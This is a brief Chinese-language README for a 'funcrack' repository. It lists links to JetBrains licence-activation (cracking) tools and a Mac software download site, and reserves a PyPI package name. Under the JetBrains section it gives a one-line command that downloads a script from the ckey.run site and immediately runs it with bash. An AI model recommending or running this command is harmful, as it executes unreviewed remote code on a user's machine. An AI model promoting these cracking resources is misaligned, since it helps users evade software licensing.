# funcrack

个人收藏的软件激活与下载资源链接清单：JetBrains 系列激活工具、Mac 软件下载站等。仓库只有这一份链接清单，没有可执行代码；`pip install funcrack` 仅用于占位保留 PyPI 包名，安装后不提供任何功能。

## Install

```bash
pip install funcrack
```

## 使用方式

本仓库不是一个可运行的工具，直接打开下面对应的链接，按各自站点的说明操作/下载即可。

## JetBrains 系列

- [ckey](https://ckey.run/)
  - `curl -L -o ckey.run ckey.run/debug && bash ckey.run`
- [热心大佬](https://3.jetbra.in/)

## Mac 软件

- [未来软件园](https://mac.macxz.com/)
